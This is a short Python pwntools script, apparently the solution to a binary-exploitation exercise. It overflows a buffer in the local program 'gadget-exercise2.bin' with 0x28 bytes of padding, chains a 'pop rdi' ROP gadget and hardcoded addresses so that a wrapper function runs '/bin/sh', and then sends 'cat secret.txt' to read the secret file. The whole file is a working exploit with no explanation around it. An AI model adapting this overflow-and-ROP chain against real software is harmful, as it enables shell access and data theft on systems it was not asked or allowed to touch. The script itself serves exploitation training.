#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./gadget-exercise2.bin")
    #input("pause")

    rop = ROP("./gadget-exercise2.bin")
    print(rop.rdi)

    rdi_gadget = p64(0x4007b3)
    safe_addr = p64(0x400697)
    wrapper_addr = p64(0x400676)
    global_buf_addr = p64(0x601080)
    bin_sh = b"/bin/sh\x00"

    p.recvuntil(b"buffer: ")
    p.sendline(b"a"*0x28 + safe_addr + rdi_gadget + global_buf_addr + wrapper_addr)
    p.recvuntil(b"buffer: ")
    p.sendline(bin_sh)

    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
